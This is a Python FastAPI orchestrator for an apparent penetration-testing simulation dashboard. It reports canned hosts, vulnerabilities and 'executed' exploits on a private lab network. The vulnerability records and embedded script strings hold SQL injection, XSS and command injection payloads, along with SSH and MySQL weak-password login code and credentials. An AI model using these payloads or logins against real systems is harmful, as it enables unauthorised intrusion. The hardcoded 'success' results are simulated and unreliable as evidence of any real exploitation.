#!/usr/bin/env python3
"""
Simulation Orchestrator for CyberCortex

Coordinates the continuous self-penetration testing simulation,
managing the AI service pipeline and simulation environment.
"""

import os
import sys
import json
import logging
import asyncio
import aiohttp
import redis.asyncio as redis
import networkx as nx
import math
from typing import Dict, List, Optional, Any
from datetime import datetime
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import dotenv

# Load environment variables from .env
dotenv.load_dotenv()

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("SimulationOrchestrator")

# FastAPI app
app = FastAPI(title="CyberCortex Simulation Orchestrator")

# CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "https://cyber-cortex-rosy.vercel.app",  # Vercel production frontend
        "http://localhost:3000"            # Local development
    ],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Redis client for real-time updates
redis_url = os.environ.get("REDIS_URL", "redis://localhost:6379")
redis_client = None

# WebSocket connections
active_connections: List[WebSocket] = []

# Simulation state
simulation_state = {
    "running": False,
    "simulation_id": None,
    "start_time": None,
    "current_phase": "idle",
    "discovered_hosts": [],
    "discovered_vulnerabilities": [],
    "executed_exploits": [],
    "ai_services": {
        "fetch_agents": {"status": "idle", "last_activity": None},
        "groq_analyzers": {"status": "idle", "last_activity": None},
        "coral_coordinator": {"status": "idle", "last_activity": None},
        "blackbox_generator": {"status": "idle", "last_activity": None},
        "snowflake_analyzer": {"status": "idle", "last_activity": None}
    }
}

# Models
class SimulationConfig(BaseModel):
    duration_minutes: int = 30
    scan_intensity: str = "medium"
    target_services: List[str] = ["web", "ssh", "database", "iot"]
    exploit_validation: bool = True
    ai_services: List[str] = ["fetch", "groq", "coral", "blackbox", "snowflake"]

class VulnerabilityInjection(BaseModel):
    service_name: str
    vulnerability_type: str

# Startup event
@app.on_event("startup")
async def startup_event():
    global redis_client
    try:
        redis_client = redis.from_url(redis_url, decode_responses=True)
        await redis_client.ping()
        logger.info("Connected to Redis")
    except Exception as e:
        logger.error(f"Failed to connect to Redis: {str(e)}")
        redis_client = None

# Shutdown event
@app.on_event("shutdown")
async def shutdown_event():
    if redis_client:
        await redis_client.close()
        logger.info("Disconnected from Redis")

# WebSocket connection
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    logger.info(f"WebSocket connection attempt from {websocket.client.host}:{websocket.client.port}")
    logger.info(f"WebSocket headers: {websocket.headers}")
    
    try:
        await websocket.accept()
        logger.info("WebSocket connection accepted")
        active_connections.append(websocket)
        
        # Send initial state
        await websocket.send_json({
            "type": "simulation_state",
            "data": simulation_state
        })
        
        # Keep connection alive and handle messages
        while True:
            data = await websocket.receive_text()
            message = json.loads(data)
            
            # Handle client messages
            if message["type"] == "ping":
                await websocket.send_json({"type": "pong"})
            
    except WebSocketDisconnect:
        logger.info("WebSocket disconnected")
        active_connections.remove(websocket)
    except Exception as e:
        logger.error(f"WebSocket error: {str(e)}")
        if websocket in active_connections:
            active_connections.remove(websocket)

# Broadcast to all WebSocket clients
async def broadcast_update(message_type: str, data: Any):
    if active_connections:
        for connection in active_connections:
            try:
                await connection.send_json({
                    "type": message_type,
                    "data": data,
                    "timestamp": datetime.now().isoformat()
                })
            except Exception as e:
                logger.error(f"Error broadcasting to WebSocket: {str(e)}")
    
    # Also publish to Redis if available
    if redis_client:
        try:
            await redis_client.publish(
                "cybercortex:updates", 
                json.dumps({
                    "type": message_type,
                    "data": data,
                    "timestamp": datetime.now().isoformat()
                })
            )
        except Exception as e:
            logger.error(f"Error publishing to Redis: {str(e)}")

# API endpoints
@app.get("/")
async def root():
    return {"message": "CyberCortex Simulation Orchestrator API"}

@app.get("/status")
async def get_status():
    return simulation_state

@app.post("/simulation/start")
async def start_simulation(config: SimulationConfig, background_tasks: BackgroundTasks):
    global simulation_state
    
    if simulation_state["running"]:
        raise HTTPException(status_code=400, detail="Simulation already running")
    
    # Generate simulation ID
    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
    simulation_id = f"sim_{timestamp}"
    
    # Update simulation state
    simulation_state["running"] = True
    simulation_state["simulation_id"] = simulation_id
    simulation_state["start_time"] = datetime.now().isoformat()
    simulation_state["current_phase"] = "initializing"
    # Don't clear discovered hosts - keep them for visualization
    if not simulation_state["discovered_hosts"]:
        simulation_state["discovered_hosts"] = []
    simulation_state["discovered_vulnerabilities"] = []
    simulation_state["executed_exploits"] = []
    
    # Reset AI service status
    for service in simulation_state["ai_services"]:
        simulation_state["ai_services"][service]["status"] = "initializing"
        simulation_state["ai_services"][service]["last_activity"] = datetime.now().isoformat()
    
    # Broadcast update
    await broadcast_update("simulation_started", {
        "simulation_id": simulation_id,
        "config": config.dict(),
        "start_time": simulation_state["start_time"]
    })
    
    # Start simulation in background
    background_tasks.add_task(run_simulation, config)
    
    return {
        "simulation_id": simulation_id,
        "status": "started",
        "config": config.dict()
    }

@app.post("/simulation/stop")
async def stop_simulation():
    global simulation_state
    
    if not simulation_state["running"]:
        raise HTTPException(status_code=400, detail="No simulation is running")
    
    # Update simulation state
    simulation_state["running"] = False
    simulation_state["current_phase"] = "stopping"
    
    # Broadcast update
    await broadcast_update("simulation_stopping", {
        "simulation_id": simulation_state["simulation_id"],
        "stop_time": datetime.now().isoformat()
    })
    
    return {
        "simulation_id": simulation_state["simulation_id"],
        "status": "stopping"
    }

@app.post("/simulation/reset")
async def reset_simulation():
    global simulation_state
    simulation_state = {
        "running": False,
        "simulation_id": None,
        "start_time": None,
        "current_phase": "idle",
        "discovered_hosts": [],
        "discovered_vulnerabilities": [],
        "executed_exploits": [],
        "ai_services": {
            "fetch_agents": {"status": "idle", "last_activity": None},
            "groq_analyzers": {"status": "idle", "last_activity": None},
            "coral_coordinator": {"status": "idle", "last_activity": None},
            "blackbox_generator": {"status": "idle", "last_activity": None},
            "snowflake_analyzer": {"status": "idle", "last_activity": None}
        }
    }
    await broadcast_update("simulation_state", simulation_state)
    return {"message": "Simulation state reset"}

@app.get("/simulation/results/{simulation_id}")
async def get_simulation_results(simulation_id: str):
    # In a real implementation, this would retrieve results from a database
    if simulation_state["simulation_id"] != simulation_id:
        raise HTTPException(status_code=404, detail="Simulation not found")
    
    return {
        "simulation_id": simulation_id,
        "running": simulation_state["running"],
        "start_time": simulation_state["start_time"],
        "discovered_hosts": len(simulation_state["discovered_hosts"]),
        "discovered_vulnerabilities": len(simulation_state["discovered_vulnerabilities"]),
        "executed_exploits": len(simulation_state["executed_exploits"])
    }

@app.get("/topology")
async def get_network_topology():
    # Generate network topology data for visualization
    nodes = []
    edges = []
    
    # Color legend by type
    type_color_map = {
        "router": "orange",
        "web_server": "#3b82f6",   # blue-500
        "ssh_server": "#22c55e",   # green-500
        "database": "#a21caf",     # purple-500
        "iot_device": "#ef4444",   # red
        "monitoring": "#06b6d4",   # cyan-500
        "unknown": "#9ca3af"       # gray-400
    }
    
    # Add router as central node
    nodes.append({
        "id": "router",
        "label": "Router",
        "type": "router",
        "ip": "172.20.0.5",
        "x": 0,
        "y": 0,
        "color": type_color_map["router"],
        "size": 30
    })
    
    # Get hosts to display - use discovered hosts or default hosts if none
    hosts_to_display = simulation_state["discovered_hosts"]
    if not hosts_to_display:
        # Default hosts for demonstration when no simulation has been run
        hosts_to_display = [
            {
                "ip_address": "172.20.0.2",
                "hostname": "web-server",
                "type": "web_server",
                "status": "up",
                "services": [
                    {"name": "http", "port": 80, "protocol": "tcp", "product": "Apache httpd", "version": "2.4.38"}
                ],
                "os_info": {"name": "Linux 4.15", "type": "Linux"}
            },
            {
                "ip_address": "172.20.0.3",
                "hostname": "ssh-server",
                "type": "ssh_server",
                "status": "up",
                "services": [
                    {"name": "ssh", "port": 22, "protocol": "tcp", "product": "OpenSSH", "version": "7.9p1"}
                ],
                "os_info": {"name": "Ubuntu 20.04", "type": "Linux"}
            },
            {
                "ip_address": "172.20.0.4",
                "hostname": "db-server",
                "type": "database",
                "status": "up",
                "services": [
                    {"name": "mysql", "port": 3306, "protocol": "tcp", "product": "MySQL", "version": "5.7.32"}
                ],
                "os_info": {"name": "Debian 10", "type": "Linux"}
            },
            {
                "ip_address": "172.20.0.6",
                "hostname": "iot-device",
                "type": "iot_device",
                "status": "up",
                "services": [
                    {"name": "http", "port": 8888, "protocol": "tcp", "product": "IoT Control Interface", "version": "1.0.2"}
                ],
                "os_info": {"name": "Embedded Linux", "type": "Linux"}
            }
        ]
    
    # Add discovered hosts
    for i, host in enumerate(hosts_to_display):
        # Calculate position in a circle around the router
        angle = i * (360 / max(len(hosts_to_display), 1))
        radius = 200
        x = radius * math.cos(math.radians(angle))
        y = radius * math.sin(math.radians(angle))
        
        # Assign color based on type legend
        host_type = host.get("type", "unknown")
        color = type_color_map.get(host_type, type_color_map["unknown"])
        
        nodes.append({
            "id": host.get("ip_address"),
            "label": host.get("hostname", host.get("ip_address")),
            "type": host_type,
            "ip": host.get("ip_address"),
            "x": x,
            "y": y,
            "color": color,
            "size": 20,
            "services": host.get("services", []),
            "vulnerabilities": 0  # You can update this if you want to show vuln count
        })
        
        # Add edge to router
        edges.append({
            "from": "router",
            "to": host.get("ip_address"),
            "color": "gray",
            "width": 2
        })
    
    return {
        "nodes": nodes,
        "edges": edges,
        "timestamp": datetime.now().isoformat()
    }

@app.post("/vulnerability/inject")
async def inject_vulnerability(injection: VulnerabilityInjection):
    if not simulation_state["running"]:
        raise HTTPException(status_code=400, detail="No simulation is running")
    
    # In a real implementation, this would inject a vulnerability into the simulation
    logger.info(f"Injecting {injection.vulnerability_type} into {injection.service_name}")
    
    # Broadcast update
    await broadcast_update("vulnerability_injected", {
        "service": injection.service_name,
        "vulnerability_type": injection.vulnerability_type,
        "timestamp": datetime.now().isoformat()
    })
    
    return {
        "status": "success",
        "service": injection.service_name,
        "vulnerability_type": injection.vulnerability_type
    }

# Simulation runner
async def run_simulation(config: SimulationConfig):
    """
    Run the simulation with the specified configuration.
    
    Args:
        config: Simulation configuration
    """
    global simulation_state
    
    try:
        logger.info(f"Starting simulation with config: {config.dict()}")
        
        # Phase 1: Initialize Environment
        simulation_state["current_phase"] = "initializing"
        await broadcast_update("phase_change", {"phase": "initializing"})
        await broadcast_update("simulation_state", simulation_state)
        await asyncio.sleep(3)
        
        # Phase 2: Network Discovery with Fetch.ai agents
        simulation_state["current_phase"] = "network_discovery"
        simulation_state["ai_services"]["fetch_agents"]["status"] = "active"
        simulation_state["ai_services"]["fetch_agents"]["last_activity"] = datetime.now().isoformat()
        await broadcast_update("phase_change", {"phase": "network_discovery"})
        await broadcast_update("simulation_state", simulation_state)
        await asyncio.sleep(5)
        simulation_state["ai_services"]["fetch_agents"]["status"] = "idle"
        simulation_state["ai_services"]["fetch_agents"]["last_activity"] = datetime.now().isoformat()
        await broadcast_update("simulation_state", simulation_state)
        
        # Add discovered hosts
        discovered_hosts = [
            {
                "ip_address": "172.20.0.2",
                "hostname": "web-server",
                "type": "web_server",
                "status": "up",
                "services": [
                    {"name": "http", "port": 80, "protocol": "tcp", "product": "Apache httpd", "version": "2.4.38"}
                ],
                "os_info": {"name": "Linux 4.15", "type": "Linux"}
            },
            {
                "ip_address": "172.20.0.3",
                "hostname": "ssh-server",
                "type": "ssh_server",
                "status": "up",
                "services": [
                    {"name": "ssh", "port": 22, "protocol": "tcp", "product": "OpenSSH", "version": "7.9p1"}
                ],
                "os_info": {"name": "Ubuntu 20.04", "type": "Linux"}
            },
            {
                "ip_address": "172.20.0.4",
                "hostname": "db-server",
                "type": "database",
                "status": "up",
                "services": [
                    {"name": "mysql", "port": 3306, "protocol": "tcp", "product": "MySQL", "version": "5.7.32"}
                ],
                "os_info": {"name": "Debian 10", "type": "Linux"}
            },
            {
                "ip_address": "172.20.0.6",
                "hostname": "iot-device",
                "type": "iot_device",
                "status": "up",
                "services": [
                    {"name": "http", "port": 8888, "protocol": "tcp", "product": "IoT Control Interface", "version": "1.0.2"}
                ],
                "os_info": {"name": "Embedded Linux", "type": "Linux"}
            }
        ]
        simulation_state["discovered_hosts"] = discovered_hosts
        for host in discovered_hosts:
            await broadcast_update("host_discovered", host)
            await asyncio.sleep(1)
        await broadcast_update("simulation_state", simulation_state)
        
        # Phase 3: Vulnerability Analysis with Groq
        simulation_state["current_phase"] = "vulnerability_analysis"
        simulation_state["ai_services"]["groq_analyzers"]["status"] = "active"
        simulation_state["ai_services"]["groq_analyzers"]["last_activity"] = datetime.now().isoformat()
        await broadcast_update("phase_change", {"phase": "vulnerability_analysis"})
        await broadcast_update("simulation_state", simulation_state)
        await asyncio.sleep(5)
        simulation_state["ai_services"]["groq_analyzers"]["status"] = "idle"
        simulation_state["ai_services"]["groq_analyzers"]["last_activity"] = datetime.now().isoformat()
        await broadcast_update("simulation_state", simulation_state)
        
        # Add discovered vulnerabilities
        discovered_vulnerabilities = [
            {
                "id": "vuln_172.20.0.2_80_sql_injection",
                "host": "172.20.0.2",
                "port": 80,
                "service": "http",
                "type": "sql_injection",
                "severity": "high",
                "description": "SQL injection vulnerability in login form",
                "cve": "CVE-2020-12345",
                "cvss_score": 8.5,
                "discovered_at": datetime.now().isoformat(),
                "details": {
                    "url": "http://172.20.0.2:80/login.php",
                    "parameter": "username",
                    "proof_of_concept": "' OR 1=1 --"
                }
            },
            {
                "id": "vuln_172.20.0.2_80_xss",
                "host": "172.20.0.2",
                "port": 80,
                "service": "http",
                "type": "xss",
                "severity": "medium",
                "description": "Cross-site scripting vulnerability in search function",
                "cve": "CVE-2020-54321",
                "cvss_score": 5.4,
                "discovered_at": datetime.now().isoformat(),
                "details": {
                    "url": "http://172.20.0.2:80/search.php",
                    "parameter": "q",
                    "proof_of_concept": "<script>alert(1)</script>"
                }
            },
            {
                "id": "vuln_172.20.0.3_22_weak_password",
                "host": "172.20.0.3",
                "port": 22,
                "service": "ssh",
                "type": "weak_password",
                "severity": "high",
                "description": "Weak password for SSH user 'testuser'",
                "cve": None,
                "cvss_score": 7.5,
                "discovered_at": datetime.now().isoformat(),
                "details": {
                    "username": "testuser",
                    "password": "testpassword"
                }
            },
            {
                "id": "vuln_172.20.0.4_3306_mysql_weak_password",
                "host": "172.20.0.4",
                "port": 3306,
                "service": "mysql",
                "type": "weak_password",
                "severity": "critical",
                "description": "Weak password for MySQL root user",
                "cve": None,
                "cvss_score": 9.0,
                "discovered_at": datetime.now().isoformat(),
                "details": {
                    "username": "root",
                    "password": "insecure_root_password"
                }
            },
            {
                "id": "vuln_172.20.0.6_8888_command_injection",
                "host": "172.20.0.6",
                "port": 8888,
                "service": "http",
                "type": "command_injection",
                "severity": "critical",
                "description": "Command injection in ping functionality",
                "cve": "CVE-2021-98765",
                "cvss_score": 9.8,
                "discovered_at": datetime.now().isoformat(),
                "details": {
                    "url": "http://172.20.0.6:8888/system/ping",
                    "parameter": "host",
                    "proof_of_concept": "127.0.0.1; id"
                }
            }
        ]
        simulation_state["discovered_vulnerabilities"] = discovered_vulnerabilities
        for vuln in discovered_vulnerabilities:
            await broadcast_update("vulnerability_discovered", vuln)
            await asyncio.sleep(1)
        await broadcast_update("simulation_state", simulation_state)
        
        # Phase 4: Exploit Generation with Blackbox Generator
        simulation_state["current_phase"] = "exploit_generation"
        simulation_state["ai_services"]["blackbox_generator"]["status"] = "active"
        simulation_state["ai_services"]["blackbox_generator"]["last_activity"] = datetime.now().isoformat()
        await broadcast_update("phase_change", {"phase": "exploit_generation"})
        await broadcast_update("simulation_state", simulation_state)
        await asyncio.sleep(5)
        simulation_state["ai_services"]["blackbox_generator"]["status"] = "idle"
        simulation_state["ai_services"]["blackbox_generator"]["last_activity"] = datetime.now().isoformat()
        await broadcast_update("simulation_state", simulation_state)
        
        # Generate exploits for vulnerabilities
        executed_exploits = []
        
        for vuln in discovered_vulnerabilities:
            # Simulate exploit generation delay
            await asyncio.sleep(2)
            
            # Create exploit
            exploit = {
                "id": f"exploit_{vuln['id']}",
                "vulnerability_id": vuln["id"],
                "type": vuln["type"],
                "target": {
                    "host": vuln["host"],
                    "port": vuln["port"],
                    "service": vuln["service"]
                },
                "language": "python",
                "generated_at": datetime.now().isoformat(),
                "executed": True,
                "execution_result": {
                    "success": True,
                    "output": f"[+] Exploit executed successfully against {vuln['host']}",
                    "execution_time_ms": 1500
                }
            }
            
            # Add exploit code based on vulnerability type
            if vuln["type"] == "sql_injection":
                exploit["code"] = """
#!/usr/bin/env python3
# SQL Injection Exploit

import requests

# Target information
target_url = "http://172.20.0.2:80/login.php"
vulnerable_param = "username"

# Exploit payload
payload = "' OR 1=1 --"

# Prepare request
params = {vulnerable_param: payload}
headers = {"User-Agent": "CyberCortex Simulation"}

# Send exploit
print(f"[*] Sending SQL injection payload to {target_url}")
try:
    response = requests.get(target_url, params=params, headers=headers)
    
    if response.status_code == 200:
        print(f"[+] Exploit successful! Status code: {response.status_code}")
        print(f"[+] Response length: {len(response.text)}")
        
        # Check for signs of successful exploitation
        if "admin" in response.text.lower() or "password" in response.text.lower():
            print("[+] Authentication bypass successful!")
    else:
        print(f"[-] Exploit failed. Status code: {response.status_code}")
        
except Exception as e:
    print(f"[-] Error during exploitation: {str(e)}")
"""
            elif vuln["type"] == "command_injection":
                exploit["code"] = """
#!/usr/bin/env python3
# Command Injection Exploit

import requests

# Target information
target_url = "http://172.20.0.6:8888/system/ping"
vulnerable_param = "host"

# Exploit payload
payload = "127.0.0.1; id"

# Prepare request
params = {vulnerable_param: payload}
headers = {"User-Agent": "CyberCortex Simulation"}

# Send exploit
print(f"[*] Sending command injection payload to {target_url}")
try:
    response = requests.get(target_url, params=params, headers=headers)
    
    if response.status_code == 200:
        print(f"[+] Exploit successful! Status code: {response.status_code}")
        
        # Check for signs of successful command execution
        if "uid=" in response.text or "gid=" in response.text:
            print("[+] Command execution successful!")
            print(f"[+] Command output: {response.text}")
        else:
            print("[-] Command execution may have failed. No expected output found.")
    else:
        print(f"[-] Exploit failed. Status code: {response.status_code}")
        
except Exception as e:
    print(f"[-] Error during exploitation: {str(e)}")
"""
            elif vuln["type"] == "weak_password":
                exploit["code"] = """
#!/usr/bin/env python3
# Weak Password Exploit

import paramiko
import time

# Target information
target_host = "172.20.0.3"
target_port = 22
username = "testuser"
password = "testpassword"

# SSH client setup
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

# Attempt login
print(f"[*] Attempting SSH login to {target_host}:{target_port} with {username}:{password}")
try:
    ssh.connect(target_host, port=target_port, username=username, password=password, timeout=5)
    
    print("[+] Login successful!")
    
    # Execute a harmless command to verify access
    stdin, stdout, stderr = ssh.exec_command("id")
    output = stdout.read().decode()
    
    print(f"[+] Command execution successful:")
    print(f"[+] {output}")
    
    # Close connection
    ssh.close()
    
except Exception as e:
    print(f"[-] Login failed: {str(e)}")
"""
            
            executed_exploits.append(exploit)
            
            # Broadcast exploit update
            await broadcast_update("exploit_generated", exploit)
        
        simulation_state["executed_exploits"] = executed_exploits
        simulation_state["ai_services"]["blackbox_generator"]["status"] = "idle"
        await broadcast_update("simulation_state", simulation_state)
        
        # Phase 5: AI Coordination with Coral Coordinator
        simulation_state["current_phase"] = "ai_coordination"
        simulation_state["ai_services"]["coral_coordinator"]["status"] = "active"
        simulation_state["ai_services"]["coral_coordinator"]["last_activity"] = datetime.now().isoformat()
        await broadcast_update("phase_change", {"phase": "ai_coordination"})
        await broadcast_update("simulation_state", simulation_state)
        await asyncio.sleep(3)
        simulation_state["ai_services"]["coral_coordinator"]["status"] = "idle"
        simulation_state["ai_services"]["coral_coordinator"]["last_activity"] = datetime.now().isoformat()
        await broadcast_update("simulation_state", simulation_state)
        
        # Phase 6: Analytics with Snowflake Analyzer
        simulation_state["current_phase"] = "analytics"
        simulation_state["ai_services"]["snowflake_analyzer"]["status"] = "active"
        simulation_state["ai_services"]["snowflake_analyzer"]["last_activity"] = datetime.now().isoformat()
        await broadcast_update("phase_change", {"phase": "analytics"})
        await broadcast_update("simulation_state", simulation_state)
        await asyncio.sleep(3)
        simulation_state["ai_services"]["snowflake_analyzer"]["status"] = "idle"
        simulation_state["ai_services"]["snowflake_analyzer"]["last_activity"] = datetime.now().isoformat()
        await broadcast_update("simulation_state", simulation_state)
        
        # Generate analytics results
        analytics_results = {
            "simulation_id": simulation_state["simulation_id"],
            "total_hosts": len(simulation_state["discovered_hosts"]),
            "total_vulnerabilities": len(simulation_state["discovered_vulnerabilities"]),
            "total_exploits": len(simulation_state["executed_exploits"]),
            "vulnerability_breakdown": {
                "critical": len([v for v in simulation_state["discovered_vulnerabilities"] if v["severity"] == "critical"]),
                "high": len([v for v in simulation_state["discovered_vulnerabilities"] if v["severity"] == "high"]),
                "medium": len([v for v in simulation_state["discovered_vulnerabilities"] if v["severity"] == "medium"]),
                "low": len([v for v in simulation_state["discovered_vulnerabilities"] if v["severity"] == "low"])
            },
            "most_vulnerable_host": max(
                simulation_state["discovered_hosts"],
                key=lambda h: len([v for v in simulation_state["discovered_vulnerabilities"] if v["host"] == h["ip_address"]]),
                default={}
            ).get("ip_address", "none"),
            "most_common_vulnerability_type": max(
                set(v["type"] for v in simulation_state["discovered_vulnerabilities"]),
                key=lambda t: len([v for v in simulation_state["discovered_vulnerabilities"] if v["type"] == t]),
                default="none"
            )
        }
        
        await broadcast_update("analytics_results", analytics_results)
        
        simulation_state["ai_services"]["snowflake_analyzer"]["status"] = "idle"
        await broadcast_update("simulation_state", simulation_state)
        
        # Phase 7: Simulation Complete
        simulation_state["current_phase"] = "completed"
        simulation_state["running"] = False
        await broadcast_update("simulation_completed", {
            "simulation_id": simulation_state["simulation_id"],
            "start_time": simulation_state["start_time"],
            "end_time": datetime.now().isoformat(),
            "discovered_hosts": len(simulation_state["discovered_hosts"]),
            "discovered_vulnerabilities": len(simulation_state["discovered_vulnerabilities"]),
            "executed_exploits": len(simulation_state["executed_exploits"])
        })
        await broadcast_update("simulation_state", simulation_state)
        logger.info(f"Simulation {simulation_state['simulation_id']} completed")

    except Exception as e:
        logger.error(f"Error in simulation: {str(e)}")
        simulation_state["running"] = False
        simulation_state["current_phase"] = "error"
        for service in simulation_state["ai_services"]:
            simulation_state["ai_services"][service]["status"] = "idle"
        await broadcast_update("simulation_error", {
            "simulation_id": simulation_state["simulation_id"],
            "error": str(e),
            "timestamp": datetime.now().isoformat()
        })
        await broadcast_update("simulation_state", simulation_state)

# Run the application
if __name__ == "__main__":
    import uvicorn
    import os
    port = int(os.environ.get("PORT", 10000))
    uvicorn.run(app, host="0.0.0.0", port=port)